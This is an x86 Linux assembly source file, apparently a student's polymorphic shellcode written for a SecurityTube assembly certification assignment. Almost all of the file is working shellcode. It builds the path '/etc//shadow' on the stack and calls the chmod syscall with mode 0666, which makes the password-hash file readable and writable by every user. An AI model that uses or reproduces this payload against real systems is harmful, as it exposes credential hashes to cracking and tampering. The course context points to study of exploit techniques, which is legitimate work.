; Filename:	chmod_poly.nasm
; Author:	aus-mate
; Purpose:	This code was written for assignment #6 of the SecurityTube Linux Assembly Expert certification.
; Student ID:	SLAE-1555

global _start

section .text

_start:
	; xor edx,edx
	; push byte +0xf
	; pop eax
	; push edx
	xor ecx, ecx
	push 0xf
	pop eax
	push ecx	
	
	; push byte +0x77
	; push word 0x6f64	
	push dword 0x776f6461
	push dword 0x68732f2f
	push dword 0x6374652f
	mov ebx,esp		

	mov cx, 0x1b6 	
	int 0x80
	
	;push byte +0x1
	;pop eax			
	;int 0x80

